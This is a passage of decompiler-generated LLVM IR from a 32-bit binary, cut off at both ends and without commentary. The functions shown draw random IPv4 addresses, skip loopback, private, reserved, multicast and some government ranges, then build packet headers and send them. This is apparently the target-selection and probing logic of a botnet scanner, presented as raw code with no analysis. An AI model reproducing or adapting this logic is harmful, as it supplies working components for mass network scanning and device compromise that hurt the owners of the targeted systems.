  uselistorder i32* %stack_var_-20, { 2, 0, 1 }
  uselistorder i32 (i32, i32)* @function_8052670, { 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_8050253, { 1, 0 }
  uselistorder label %dec_label_pc_80501ca, { 1, 0 }
}

define i32 @function_8050a01() local_unnamed_addr {
dec_label_pc_8050a01:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  br label %dec_label_pc_8050f31

dec_label_pc_8050f31:                             ; preds = %dec_label_pc_8050f1b, %dec_label_pc_8050a01
  %v0_8050a01 = load i32, i32* @global_var_80572b0.34, align 16
  store i32 %v0_8050a01, i32* @esi, align 4
  %v0_8050a07 = load i32, i32* @esp, align 4
  %v1_8050a07 = add i32 %v0_8050a07, 24
  %v2_8050a07 = inttoptr i32 %v1_8050a07 to i32*
  %v3_8050a07 = load i32, i32* %v2_8050a07, align 4
  %v15_8050a07 = icmp eq i32 %v3_8050a07, %v0_8050a01
  br i1 %v15_8050a07, label %dec_label_pc_8050cc0, label %dec_label_pc_8050a11

dec_label_pc_8050a11:                             ; preds = %dec_label_pc_8050f31
  %v1_8050a11 = add i32 %v0_8050a07, 1828
  store i32 %v1_8050a11, i32* @ebp, align 4
  %v1_8050a18 = add i32 %v0_8050a07, 1868
  %v2_8050a18 = inttoptr i32 %v1_8050a18 to i32*
  store i32 0, i32* %v2_8050a18, align 4
  %v0_8050bc6.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8050bc6

dec_label_pc_8050a28:                             ; preds = %dec_label_pc_8050c3a
  %v11_8050a28 = icmp eq i8 %v2_8050c1d, -84
  br i1 %v11_8050a28, label %dec_label_pc_8050c85, label %dec_label_pc_8050a31

dec_label_pc_8050a31:                             ; preds = %dec_label_pc_8050a28
  %v10_8050a31 = icmp eq i8 %v2_8050c1d, 100
  br i1 %v10_8050a31, label %dec_label_pc_8050a31.dec_label_pc_8050c51_crit_edge, label %dec_label_pc_8050a3a

dec_label_pc_8050a31.dec_label_pc_8050c51_crit_edge: ; preds = %dec_label_pc_8050a31
  %.pre = trunc i32 %v2_8050c14 to i8
  br label %dec_label_pc_8050c51

dec_label_pc_8050a3a:                             ; preds = %dec_label_pc_8050c48, %dec_label_pc_8050a31
  %v11_8050a3a = icmp eq i8 %v2_8050c1d, -87
  br i1 %v11_8050a3a, label %dec_label_pc_8050ca0, label %dec_label_pc_8050a43

dec_label_pc_8050a43:                             ; preds = %dec_label_pc_8050c97, %dec_label_pc_8050a3a
  %v0_8050a43 = phi i32 [ %v0_8050c97, %dec_label_pc_8050c97 ], [ %v5_8050c12, %dec_label_pc_8050a3a ]
  %v0_8050acb69 = phi i32 [ %v0_8050c8e, %dec_label_pc_8050c97 ], [ %v2_8050c14, %dec_label_pc_8050a3a ]
  %v1_8050a43 = trunc i32 %v0_8050a43 to i8
  %v11_8050a43 = icmp eq i8 %v1_8050a43, -58
  br i1 %v11_8050a43, label %dec_label_pc_8050c68, label %dec_label_pc_8050a4c

dec_label_pc_8050a4c:                             ; preds = %dec_label_pc_8050ca0, %dec_label_pc_8050c5f, %dec_label_pc_8050a43
  %v0_8050a4c = phi i32 [ %v0_8050a4c76, %dec_label_pc_8050ca0 ], [ %v5_8050c12, %dec_label_pc_8050c5f ], [ %v0_8050a43, %dec_label_pc_8050a43 ]
  %v0_8050acb68 = phi i32 [ %v0_8050ca0, %dec_label_pc_8050ca0 ], [ %v2_8050c14, %dec_label_pc_8050c5f ], [ %v0_8050acb69, %dec_label_pc_8050a43 ]
  %v1_8050a4c = trunc i32 %v0_8050a4c to i8
  %tmp283 = icmp ult i8 %v1_8050a4c, -32
  br i1 %tmp283, label %dec_label_pc_8050a55, label %dec_label_pc_8050c07.preheader

dec_label_pc_8050a55:                             ; preds = %dec_label_pc_8050c51, %dec_label_pc_8050c85.dec_label_pc_8050a55_crit_edge, %dec_label_pc_8050c71, %dec_label_pc_8050a4c, %dec_label_pc_8050c68
  %v0_8050acb = phi i32 [ %v0_8050c8e, %dec_label_pc_8050c85.dec_label_pc_8050a55_crit_edge ], [ %v0_8050c71, %dec_label_pc_8050c71 ], [ %v0_8050acb68, %dec_label_pc_8050a4c ], [ %v0_8050c71, %dec_label_pc_8050c68 ], [ %v2_8050c14, %dec_label_pc_8050c51 ]
  %v0_8050ad9 = phi i32 [ %v0_8050a55.pre, %dec_label_pc_8050c85.dec_label_pc_8050a55_crit_edge ], [ %v0_8050a5565, %dec_label_pc_8050c71 ], [ %v0_8050a4c, %dec_label_pc_8050a4c ], [ %v0_8050a5565, %dec_label_pc_8050c68 ], [ %v5_8050c12, %dec_label_pc_8050c51 ]
  %v1_8050a55 = add i32 %v0_8050ad9, -6
  store i32 %v1_8050a55, i32* %eax.global-to-local, align 4
  %v1_8050a58 = trunc i32 %v1_8050a55 to i8
  %tmp284 = or i8 %v1_8050a58, 1
  %tmp285 = icmp eq i8 %tmp284, 1
  br i1 %tmp285, label %dec_label_pc_8050c07.preheader, label %dec_label_pc_8050a60

dec_label_pc_8050a60:                             ; preds = %dec_label_pc_8050a55
  %v1_8050a60 = trunc i32 %v0_8050ad9 to i8
  %v10_8050a60 = icmp eq i8 %v1_8050a60, 11
  br i1 %v10_8050a60, label %dec_label_pc_8050c07.preheader, label %dec_label_pc_8050a69

dec_label_pc_8050a69:                             ; preds = %dec_label_pc_8050a60
  %v10_8050a69 = icmp eq i8 %v1_8050a60, 21
  br i1 %v10_8050a69, label %dec_label_pc_8050c07.preheader, label %dec_label_pc_8050a72

dec_label_pc_8050a72:                             ; preds = %dec_label_pc_8050a69
  %v10_8050a72 = icmp eq i8 %v1_8050a60, 22
  br i1 %v10_8050a72, label %dec_label_pc_8050c07.preheader, label %dec_label_pc_8050a7b

dec_label_pc_8050a7b:                             ; preds = %dec_label_pc_8050a72
  %v10_8050a7b = icmp eq i8 %v1_8050a60, 26
  br i1 %v10_8050a7b, label %dec_label_pc_8050c07.preheader, label %dec_label_pc_8050a84

dec_label_pc_8050a84:                             ; preds = %dec_label_pc_8050a7b
  %v10_8050a84 = icmp eq i8 %v1_8050a60, 28
  br i1 %v10_8050a84, label %dec_label_pc_8050c07.preheader, label %dec_label_pc_8050a8d

dec_label_pc_8050a8d:                             ; preds = %dec_label_pc_8050a84
  %v10_8050a8d = icmp eq i8 %v1_8050a60, 29
  br i1 %v10_8050a8d, label %dec_label_pc_8050c07.preheader, label %dec_label_pc_8050a96

dec_label_pc_8050a96:                             ; preds = %dec_label_pc_8050a8d
  %v10_8050a96 = icmp eq i8 %v1_8050a60, 30
  br i1 %v10_8050a96, label %dec_label_pc_8050c07.preheader, label %dec_label_pc_8050a9f

dec_label_pc_8050a9f:                             ; preds = %dec_label_pc_8050a96
  %v10_8050a9f = icmp eq i8 %v1_8050a60, 33
  br i1 %v10_8050a9f, label %dec_label_pc_8050c07.preheader, label %dec_label_pc_8050aa8

dec_label_pc_8050aa8:                             ; preds = %dec_label_pc_8050a9f
  %v10_8050aa8 = icmp eq i8 %v1_8050a60, 55
  br i1 %v10_8050aa8, label %dec_label_pc_8050c07.preheader, label %dec_label_pc_8050ab1

dec_label_pc_8050ab1:                             ; preds = %dec_label_pc_8050aa8
  %v11_8050ab1 = icmp eq i8 %v1_8050a60, -42
  br i1 %v11_8050ab1, label %dec_label_pc_8050c07.preheader, label %dec_label_pc_8050aba

dec_label_pc_8050aba:                             ; preds = %dec_label_pc_8050ab1
  %v11_8050aba = icmp eq i8 %v1_8050a60, -41
  br i1 %v11_8050aba, label %dec_label_pc_8050c07.preheader, label %dec_label_pc_8050ac3

dec_label_pc_8050ac3:                             ; preds = %dec_label_pc_8050aba
  %v0_8050ac5 = load i32, i32* @edx, align 4
  store i16 0, i16* bitcast (i32* @global_var_805728a.35 to i16*), align 4
  %v1_8050acb = mul i32 %v0_8050acb, 65536
  %v2_8050ad6 = and i32 %v1_8050acb, 16711680
  %v2_8050ad9 = mul i32 %v0_8050ad9, 16777216
  %v1_8050ac5 = mul i32 %v0_8050ac5, 256
  %v2_8050adf = or i32 %v2_8050ad6, %v2_8050ad9
  %v0_8050ae1 = load i32, i32* @edi, align 4
  %v1_8050ae3 = urem i32 %v0_8050ae1, 256
  store i32 %v1_8050ae3, i32* %eax.global-to-local, align 4
  %v2_8050ae8 = or i32 %v1_8050ae3, %v2_8050adf
  store i32 %v2_8050ae8, i32* %ecx.global-to-local, align 4
  %v2_8050aea = or i32 %v1_8050ae3, %v1_8050ac5
  %v1_8050aec = load i32, i32* @esp, align 4
  %v2_8050aec = add i32 %v1_8050aec, -4
  %v3_8050aec = inttoptr i32 %v2_8050aec to i32*
  store i32 %v2_8050ae8, i32* %v3_8050aec, align 4
  %v1_8050aed = trunc i32 %v2_8050aea to i16
  %v2_8050aed = call i16 @llvm.bswap.i16(i16 %v1_8050aed)
  %v3_8050aed = zext i16 %v2_8050aed to i32
  %v1_8050af1 = udiv i32 %v2_8050adf, 65536
  %v2_8050af1 = mul nuw i32 %v3_8050aed, 65536
  %v1_8050af4 = trunc i32 %v1_8050af1 to i16
  %v2_8050af4 = call i16 @llvm.bswap.i16(i16 %v1_8050af4)
  %v3_8050af4 = zext i16 %v2_8050af4 to i32
  %v6_8050af4 = or i32 %v2_8050af1, %v3_8050af4
  store i32 %v6_8050af4, i32* %edx.global-to-local, align 4
  %v0_8050af8 = load i32, i32* %ecx.global-to-local, align 4
  %v2_8050af8 = add i32 %v1_8050aec, -8
  %v3_8050af8 = inttoptr i32 %v2_8050af8 to i32*
  store i32 %v0_8050af8, i32* %v3_8050af8, align 4
  %v0_8050af9 = load i32, i32* %edx.global-to-local, align 4
  store i32 %v0_8050af9, i32* @global_var_8057290.36, align 16
  %v1_8050aff = add i32 %v1_8050aec, -12
  %v2_8050aff = inttoptr i32 %v1_8050aff to i32*
  store i32 20, i32* %v2_8050aff, align 4
  %v1_8050b01 = add i32 %v1_8050aec, -16
  %v2_8050b01 = inttoptr i32 %v1_8050b01 to i32*
  store i32 ptrtoint (i32* @global_var_8057280.37 to i32), i32* %v2_8050b01, align 4
  %v0_8050b06 = call i32 @function_804de40()
  %v1_8050b06 = trunc i32 %v0_8050b06 to i16
  store i32 %v0_8050b06, i32* %eax.global-to-local, align 4
  %v0_8050b0b = load i32, i32* @esp, align 4
  %v1_8050b0b = add i32 %v0_8050b0b, 1884
  %v2_8050b0b = inttoptr i32 %v1_8050b0b to i32*
  %v3_8050b0b = load i32, i32* %v2_8050b0b, align 4
  store i16 %v1_8050b06, i16* bitcast (i32* @global_var_805728a.35 to i16*), align 4
  store i32 10, i32* %ecx.global-to-local, align 4
  %v2_8050b21 = ashr i32 %v3_8050b0b, 31
  %v2_8050b27 = zext i32 %v3_8050b0b to i64
  %v4_8050b27 = zext i32 %v2_8050b21 to i64
  %v5_8050b27 = mul nuw i64 %v4_8050b27, 4294967296
  %v6_8050b27 = or i64 %v5_8050b27, %v2_8050b27
  %v10_8050b27 = srem i64 %v6_8050b27, 10
  %v11_8050b27 = trunc i64 %v10_8050b27 to i32
  store i32 %v11_8050b27, i32* %edx.global-to-local, align 4
  %v1_8050b29 = icmp eq i32 %v11_8050b27, 0
  %v1_8050b2b = icmp eq i1 %v1_8050b29, false
  %. = select i1 %v1_8050b2b, i16 5888, i16 4873
  store i16 %., i16* @global_var_8057296.38, align 2
  %v0_8050b3a = load i32, i32* @global_var_8057290.36, align 16
  store i32 %v0_8050b3a, i32* %eax.global-to-local, align 4
  %v1_8050b3f = add i32 %v0_8050b0b, 12
  %v2_8050b3f = inttoptr i32 %v1_8050b3f to i32*
  store i32 20, i32* %v2_8050b3f, align 4
  %v0_8050b41 = load i32, i32* %eax.global-to-local, align 4
  store i32 %v0_8050b41, i32* @global_var_8057298.39, align 8
  %v1_8050b46 = add i32 %v0_8050b0b, 8
  %v2_8050b46 = inttoptr i32 %v1_8050b46 to i32*
  store i32 5120, i32* %v2_8050b46, align 4
  store i16 0, i16* bitcast (i32* @global_var_80572a4.40 to i16*), align 4
  %v1_8050b54 = add i32 %v0_8050b0b, 4
  %v2_8050b54 = inttoptr i32 %v1_8050b54 to i32*
  store i32 ptrtoint (i32* @global_var_8057294.41 to i32), i32* %v2_8050b54, align 4
  %v2_8050b59 = inttoptr i32 %v0_8050b0b to i32*
  store i32 ptrtoint (i32* @global_var_8057280.37 to i32), i32* %v2_8050b59, align 4
  %v0_8050b5e = call i32 @function_804de90()
  %v1_8050b5e = trunc i32 %v0_8050b5e to i16
  store i16 %v1_8050b5e, i16* bitcast (i32* @global_var_80572a4.40 to i16*), align 4
  %v0_8050b69 = load i32, i32* @global_var_8057290.36, align 16
  store i32 %v0_8050b69, i32* %eax.global-to-local, align 4
  %v1_8050b6e = load i32, i32* @esp, align 4
  %v2_8050b6e = add i32 %v1_8050b6e, 1848
  %v3_8050b6e = inttoptr i32 %v2_8050b6e to i32*
  store i32 %v0_8050b69, i32* %v3_8050b6e, align 4
  %v0_8050b75 = load i16, i16* @global_var_8057296.38, align 2
  %v1_8050b75 = zext i16 %v0_8050b75 to i32
  %v2_8050b75 = load i32, i32* %eax.global-to-local, align 4
  %v3_8050b75 = and i32 %v2_8050b75, -65536
  %v4_8050b75 = or i32 %v3_8050b75, %v1_8050b75
  store i32 %v4_8050b75, i32* %eax.global-to-local, align 4
  %v0_8050b7b = load i32, i32* @esp, align 4
  %v1_8050b7b = add i32 %v0_8050b7b, 1844
  %v2_8050b7b = inttoptr i32 %v1_8050b7b to i16*
  store i16 2, i16* %v2_8050b7b, align 2
  %v0_8050b85 = load i32, i32* %eax.global-to-local, align 4
  %v1_8050b85 = trunc i32 %v0_8050b85 to i16
  %v2_8050b85 = load i32, i32* @esp, align 4
  %v3_8050b85 = add i32 %v2_8050b85, 1846
  %v4_8050b85 = inttoptr i32 %v3_8050b85 to i16*
  store i16 %v1_8050b85, i16* %v4_8050b85, align 2
  %v0_8050b8d = load i32, i32* @esp, align 4
  %v1_8050b8d = inttoptr i32 %v0_8050b8d to i32*
  %v3_8050b8d = add i32 %v0_8050b8d, 4
  %v0_8050b8e = load i32, i32* @global_var_80572fc.42, align 4
  store i32 %v0_8050b8e, i32* %eax.global-to-local, align 4
  %v1_8050b93 = inttoptr i32 %v3_8050b8d to i32*
  %v2_8050b93 = load i32, i32* %v1_8050b93, align 4
  store i32 %v2_8050b93, i32* %edx.global-to-local, align 4
  store i32 16, i32* %v1_8050b93, align 4
  %v0_8050b96 = load i32, i32* @ebp, align 4
  store i32 %v0_8050b96, i32* %v1_8050b8d, align 4
  %v1_8050b97 = add i32 %v0_8050b8d, -4
  %v2_8050b97 = inttoptr i32 %v1_8050b97 to i32*
  store i32 16384, i32* %v2_8050b97, align 4
  %v1_8050b9c = add i32 %v0_8050b8d, -8
  %v2_8050b9c = inttoptr i32 %v1_8050b9c to i32*
  store i32 40, i32* %v2_8050b9c, align 4
  %v1_8050b9e = add i32 %v0_8050b8d, -12
  %v2_8050b9e = inttoptr i32 %v1_8050b9e to i32*
  store i32 ptrtoint (i32* @global_var_8057280.37 to i32), i32* %v2_8050b9e, align 4
  %v0_8050ba3 = load i32, i32* %eax.global-to-local, align 4
  %v2_8050ba3 = add i32 %v0_8050b8d, -16
  %v3_8050ba3 = inttoptr i32 %v2_8050ba3 to i32*
  store i32 %v0_8050ba3, i32* %v3_8050ba3, align 4
  %v0_8050ba4 = call i32 @function_80532f7()
  store i32 %v0_8050ba4, i32* %eax.global-to-local, align 4
  %v0_8050ba9 = load i32, i32* @esp, align 4
  %v1_8050ba9 = add i32 %v0_8050ba9, 1900
  %v2_8050ba9 = inttoptr i32 %v1_8050ba9 to i32*
  %v3_8050ba9 = load i32, i32* %v2_8050ba9, align 4
  %v1_8050bb0 = add i32 %v3_8050ba9, 1
  store i32 %v1_8050bb0, i32* %eax.global-to-local, align 4
  store i32 %v1_8050bb0, i32* %v2_8050ba9, align 4
  %v0_8050bb8 = load i32, i32* @esp, align 4
  %v1_8050bb8 = add i32 %v0_8050bb8, 32
  %v0_8050bbb = load i32, i32* %eax.global-to-local, align 4
  %v1_8050bbb = add i32 %v0_8050bbb, -383
  %v6_8050bbb = sub i32 382, %v0_8050bbb
  %v7_8050bbb = and i32 %v6_8050bbb, %v0_8050bbb
  %v8_8050bbb = icmp slt i32 %v7_8050bbb, 0
  %v9_8050bbb = icmp eq i32 %v1_8050bbb, 0
  %v10_8050bbb = icmp slt i32 %v1_8050bbb, 0
  %v3_8050bc0 = icmp eq i1 %v10_8050bbb, %v8_8050bbb
  %v4_8050bc0 = icmp eq i1 %v9_8050bbb, false
  %v5_8050bc0 = and i1 %v4_8050bc0, %v3_8050bc0
  br i1 %v5_8050bc0, label %dec_label_pc_8050cbc, label %dec_label_pc_8050bc6

dec_label_pc_8050bc6:                             ; preds = %dec_label_pc_8050ac3, %dec_label_pc_8050a11
  %v0_8050bc6 = phi i32 [ %v1_8050bb8, %dec_label_pc_8050ac3 ], [ %v0_8050bc6.pre, %dec_label_pc_8050a11 ]
  %v1_8050bc6 = add i32 %v0_8050bc6, 1828
  %v2_8050bc6 = inttoptr i32 %v1_8050bc6 to i32*
  store i32 0, i32* %v2_8050bc6, align 4
  %v0_8050bd1 = load i32, i32* @esp, align 4
  %v1_8050bd1 = add i32 %v0_8050bd1, 1832
  %v2_8050bd1 = inttoptr i32 %v1_8050bd1 to i32*
  store i32 0, i32* %v2_8050bd1, align 4
  %v0_8050bdc = load i32, i32* @esp, align 4
  %v1_8050bdc = add i32 %v0_8050bdc, 1836
  %v2_8050bdc = inttoptr i32 %v1_8050bdc to i32*
  store i32 0, i32* %v2_8050bdc, align 4
  %v0_8050be7 = load i32, i32* @esp, align 4
  %v1_8050be7 = add i32 %v0_8050be7, 1840
  %v2_8050be7 = inttoptr i32 %v1_8050be7 to i32*
  store i32 0, i32* %v2_8050be7, align 4
  %v1_8050bf2 = call i32 @function_804fa00(i32 ptrtoint (i32* @0 to i32))
  %v2_8050bf2 = trunc i32 %v1_8050bf2 to i16
  store i16 %v2_8050bf2, i16* bitcast (i32* @global_var_8057284.43 to i16*), align 4
  %v0_8050bfd = load i32, i32* @global_var_80572dc.27, align 4
  store i32 %v0_8050bfd, i32* %eax.global-to-local, align 4
  store i32 %v0_8050bfd, i32* @global_var_805728c.44, align 4
  br label %dec_label_pc_8050c07.preheader

dec_label_pc_8050c07.preheader:                   ; preds = %dec_label_pc_8050bc6, %dec_label_pc_8050a55, %dec_label_pc_8050a60, %dec_label_pc_8050a69, %dec_label_pc_8050a72, %dec_label_pc_8050a7b, %dec_label_pc_8050a84, %dec_label_pc_8050a8d, %dec_label_pc_8050a96, %dec_label_pc_8050a9f, %dec_label_pc_8050aa8, %dec_label_pc_8050ab1, %dec_label_pc_8050aba, %dec_label_pc_8050c71, %dec_label_pc_8050c8e, %dec_label_pc_8050a4c, %dec_label_pc_8050ca0
  br label %dec_label_pc_8050c07

dec_label_pc_8050c07:                             ; preds = %dec_label_pc_8050c5a, %dec_label_pc_8050c43, %dec_label_pc_8050c35, %dec_label_pc_8050c30, %dec_label_pc_8050c29, %dec_label_pc_8050c25, %dec_label_pc_8050c21, %dec_label_pc_8050c07, %dec_label_pc_8050c07.preheader
  %v1_8050c07 = call i32 @function_804fa00(i32 ptrtoint (i32* @0 to i32))
  store i32 %v1_8050c07, i32* %eax.global-to-local, align 4
  %sext = mul i32 %v1_8050c07, 65536
  %v1_8050c0c = sdiv i32 %sext, 65536
  %v2_8050c12 = urem i32 %v1_8050c07, 256
  %v3_8050c12 = load i32, i32* @ecx, align 4
  %v4_8050c12 = and i32 %v3_8050c12, -256
  %v5_8050c12 = or i32 %v4_8050c12, %v2_8050c12
  store i32 %v5_8050c12, i32* @ecx, align 4
  %v2_8050c14 = udiv i32 %v1_8050c0c, 256
  store i32 %v2_8050c14, i32* @ebx, align 4
  %v2_8050c17 = udiv i32 %v1_8050c0c, 65536
  store i32 %v2_8050c17, i32* @edx, align 4
  %v2_8050c1a = udiv i32 %v1_8050c0c, 16777216
  store i32 %v2_8050c1a, i32* @edi, align 4
  %v2_8050c1d = trunc i32 %v1_8050c07 to i8
  %v11_8050c1d = icmp eq i8 %v2_8050c1d, 127
  br i1 %v11_8050c1d, label %dec_label_pc_8050c07, label %dec_label_pc_8050c21

dec_label_pc_8050c21:                             ; preds = %dec_label_pc_8050c07
  %v6_8050c21 = icmp eq i8 %v2_8050c1d, 0
  br i1 %v6_8050c21, label %dec_label_pc_8050c07, label %dec_label_pc_8050c25

dec_label_pc_8050c25:                             ; preds = %dec_label_pc_8050c21
  %v11_8050c25 = icmp eq i8 %v2_8050c1d, 3
  br i1 %v11_8050c25, label %dec_label_pc_8050c07, label %dec_label_pc_8050c29

dec_label_pc_8050c29:                             ; preds = %dec_label_pc_8050c25
  %v2_8050c29 = add nsw i32 %v1_8050c0c, -15
  store i32 %v2_8050c29, i32* %eax.global-to-local, align 4
  %v1_8050c2c = trunc i32 %v2_8050c29 to i8
  %tmp286 = or i8 %v1_8050c2c, 1
  %tmp287 = icmp eq i8 %tmp286, 1
  br i1 %tmp287, label %dec_label_pc_8050c07, label %dec_label_pc_8050c30

dec_label_pc_8050c30:                             ; preds = %dec_label_pc_8050c29
  %v10_8050c30 = icmp eq i8 %v2_8050c1d, 56
  br i1 %v10_8050c30, label %dec_label_pc_8050c07, label %dec_label_pc_8050c35

dec_label_pc_8050c35:                             ; preds = %dec_label_pc_8050c30
  %v10_8050c35 = icmp eq i8 %v2_8050c1d, 10
  br i1 %v10_8050c35, label %dec_label_pc_8050c07, label %dec_label_pc_8050c3a

dec_label_pc_8050c3a:                             ; preds = %dec_label_pc_8050c35
  %v8_8050c3a = icmp eq i8 %v2_8050c1d, -64
  %v1_8050c3d = icmp eq i1 %v8_8050c3a, false
  br i1 %v1_8050c3d, label %dec_label_pc_8050a28, label %dec_label_pc_8050c43

dec_label_pc_8050c43:                             ; preds = %dec_label_pc_8050c3a
  %v1_8050c43 = trunc i32 %v2_8050c14 to i8
  %v11_8050c43 = icmp eq i8 %v1_8050c43, -88
  br i1 %v11_8050c43, label %dec_label_pc_8050c07, label %dec_label_pc_8050c48

dec_label_pc_8050c48:                             ; preds = %dec_label_pc_8050c43
  %v10_8050c48 = icmp eq i8 %v2_8050c1d, 100
  %v1_8050c4b = icmp eq i1 %v10_8050c48, false
  br i1 %v1_8050c4b, label %dec_label_pc_8050a3a, label %dec_label_pc_8050c51

dec_label_pc_8050c51:                             ; preds = %dec_label_pc_8050a31.dec_label_pc_8050c51_crit_edge, %dec_label_pc_8050c48
  %v1_8050c51.pre-phi = phi i8 [ %.pre, %dec_label_pc_8050a31.dec_label_pc_8050c51_crit_edge ], [ %v1_8050c43, %dec_label_pc_8050c48 ]
  %tmp288 = icmp ult i8 %v1_8050c51.pre-phi, 64
  br i1 %tmp288, label %dec_label_pc_8050a55, label %dec_label_pc_8050c5a

dec_label_pc_8050c5a:                             ; preds = %dec_label_pc_8050c51
  %tmp289 = icmp ult i8 %v1_8050c51.pre-phi, 127
  br i1 %tmp289, label %dec_label_pc_8050c07, label %dec_label_pc_8050c5f

dec_label_pc_8050c5f:                             ; preds = %dec_label_pc_8050c5a
  %v11_8050c5f = icmp eq i8 %v2_8050c1d, -58
  %v1_8050c62 = icmp eq i1 %v11_8050c5f, false
  br i1 %v1_8050c62, label %dec_label_pc_8050a4c, label %dec_label_pc_8050c68

dec_label_pc_8050c68:                             ; preds = %dec_label_pc_8050c5f, %dec_label_pc_8050a43
  %v0_8050c71 = phi i32 [ %v2_8050c14, %dec_label_pc_8050c5f ], [ %v0_8050acb69, %dec_label_pc_8050a43 ]
  %v0_8050a5565 = phi i32 [ %v5_8050c12, %dec_label_pc_8050c5f ], [ %v0_8050a43, %dec_label_pc_8050a43 ]
  %v1_8050c68 = trunc i32 %v0_8050c71 to i8
  %tmp290 = icmp ult i8 %v1_8050c68, 18
  br i1 %tmp290, label %dec_label_pc_8050a55, label %dec_label_pc_8050c71

dec_label_pc_8050c71:                             ; preds = %dec_label_pc_8050c68
  %tmp291 = or i8 %v1_8050c68, 1
  %tmp292 = icmp eq i8 %tmp291, 19
  br i1 %tmp292, label %dec_label_pc_8050c07.preheader, label %dec_label_pc_8050a55

dec_label_pc_8050c7b:                             ; preds = %dec_label_pc_8051a25
  store i32 0, i32* %v2_8050c7e, align 4
  %v1_8050c80 = call i32 @function_80546c9(i32 ptrtoint (i32* @0 to i32))
  store i32 %v1_8050c80, i32* %eax.global-to-local, align 4
  %v0_8050c85.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8050c85

dec_label_pc_8050c85:                             ; preds = %dec_label_pc_8050a28, %dec_label_pc_8050c7b
  %v0_8050c8e = phi i32 [ %v0_8050c85.pre, %dec_label_pc_8050c7b ], [ %v2_8050c14, %dec_label_pc_8050a28 ]
  %v1_8050c85 = trunc i32 %v0_8050c8e to i8
  %tmp293 = icmp ult i8 %v1_8050c85, 16
  br i1 %tmp293, label %dec_label_pc_8050c85.dec_label_pc_8050a55_crit_edge, label %dec_label_pc_8050c8e

dec_label_pc_8050c85.dec_label_pc_8050a55_crit_edge: ; preds = %dec_label_pc_8050c85
  %v0_8050a55.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_8050a55

dec_label_pc_8050c8e:                             ; preds = %dec_label_pc_8050c85
  %tmp294 = icmp ult i8 %v1_8050c85, 32
  br i1 %tmp294, label %dec_label_pc_8050c07.preheader, label %dec_label_pc_8050c97

dec_label_pc_8050c97:                             ; preds = %dec_label_pc_8050c8e
  %v0_8050c97 = load i32, i32* @ecx, align 4
  %v1_8050c97 = trunc i32 %v0_8050c97 to i8
  %v11_8050c97 = icmp eq i8 %v1_8050c97, -87
  %v1_8050c9a = icmp eq i1 %v11_8050c97, false
  br i1 %v1_8050c9a, label %dec_label_pc_8050a43, label %dec_label_pc_8050ca0

dec_label_pc_8050ca0:                             ; preds = %dec_label_pc_8050c97, %dec_label_pc_8050a3a
  %v0_8050a4c76 = phi i32 [ %v0_8050c97, %dec_label_pc_8050c97 ], [ %v5_8050c12, %dec_label_pc_8050a3a ]
  %v0_8050ca0 = phi i32 [ %v0_8050c8e, %dec_label_pc_8050c97 ], [ %v2_8050c14, %dec_label_pc_8050a3a ]
  %v1_8050ca0 = trunc i32 %v0_8050ca0 to i8
  %v11_8050ca0 = icmp eq i8 %v1_8050ca0, -1
  %v1_8050ca3 = icmp eq i1 %v11_8050ca0, false
  br i1 %v1_8050ca3, label %dec_label_pc_8050a4c, label %dec_label_pc_8050c07.preheader

dec_label_pc_8050cbc:                             ; preds = %dec_label_pc_8050ac3
  %v0_8050cbc = load i32, i32* @esi, align 4
  %v2_8050cbc = add i32 %v0_8050bb8, 56
  %v3_8050cbc = inttoptr i32 %v2_8050cbc to i32*
  store i32 %v0_8050cbc, i32* %v3_8050cbc, align 4
  br label %dec_label_pc_8050cc0

dec_label_pc_8050cc0:                             ; preds = %dec_label_pc_8050f31, %dec_label_pc_8050cbc
  %v1_8050cc0 = call i32 @function_80530b9(i32 ptrtoint (i32* @0 to i32))
  store i32 %v1_8050cc0, i32* %eax.global-to-local, align 4
  store i32 0, i32* @ebx, align 4
  %v1_8050cc7 = load i32, i32* @esp, align 4
  %v2_8050cc7 = add i32 %v1_8050cc7, 40
  %v3_8050cc7 = inttoptr i32 %v2_8050cc7 to i32*
  store i32 %v1_8050cc0, i32* %v3_8050cc7, align 4
  br label %dec_label_pc_8050ccb

dec_label_pc_8050ccb:                             ; preds = %dec_label_pc_8050d68, %dec_label_pc_8050d60, %dec_label_pc_8050d58, %dec_label_pc_8050d50, %dec_label_pc_8050d44, %dec_label_pc_8050d38, %dec_label_pc_8050d31, %dec_label_pc_8050d1f, %dec_label_pc_8050d13, %dec_label_pc_8050d0e, %dec_label_pc_8050dca, %dec_label_pc_8050cc0
  %v0_8050ccb = load i32, i32* @esp, align 4
  %v1_8050ccb = add i32 %v0_8050ccb, 40
  %v2_8050ccb = inttoptr i32 %v1_8050ccb to i32*
  %v3_8050ccb = load i32, i32* %v2_8050ccb, align 4
  store i32 %v3_8050ccb, i32* %eax.global-to-local, align 4
  %v1_8050ccf = inttoptr i32 %v3_8050ccb to i32*
  store i32 0, i32* %v1_8050ccf, align 4
  %v0_8050cd5 = load i32, i32* @edi, align 4
  %v1_8050cd5 = load i32, i32* @esp, align 4
  %v2_8050cd5 = add i32 %v1_8050cd5, -4
  %v3_8050cd5 = inttoptr i32 %v2_8050cd5 to i32*
  store i32 %v0_8050cd5, i32* %v3_8050cd5, align 4
  %v0_8050cd6 = load i32, i32* @edi, align 4
  %v2_8050cd6 = add i32 %v1_8050cd5, -8
  %v3_8050cd6 = inttoptr i32 %v2_8050cd6 to i32*
  store i32 %v0_8050cd6, i32* %v3_8050cd6, align 4
  %v1_8050cd7 = add i32 %v1_8050cd5, -12
  %v2_8050cd7 = inttoptr i32 %v1_8050cd7 to i32*
  store i32 0, i32* %v2_8050cd7, align 4
  %v1_8050cd9 = add i32 %v1_8050cd5, -16
  %v2_8050cd9 = inttoptr i32 %v1_8050cd9 to i32*
  store i32 0, i32* %v2_8050cd9, align 4
  %v1_8050cdb = add i32 %v1_8050cd5, -20
  %v2_8050cdb = inttoptr i32 %v1_8050cdb to i32*
  store i32 16384, i32* %v2_8050cdb, align 4
  %v1_8050ce0 = add i32 %v1_8050cd5, -24
  %v2_8050ce0 = inttoptr i32 %v1_8050ce0 to i32*
  store i32 1514, i32* %v2_8050ce0, align 4
  %v0_8050ce5 = load i32, i32* @global_var_80572fc.42, align 4
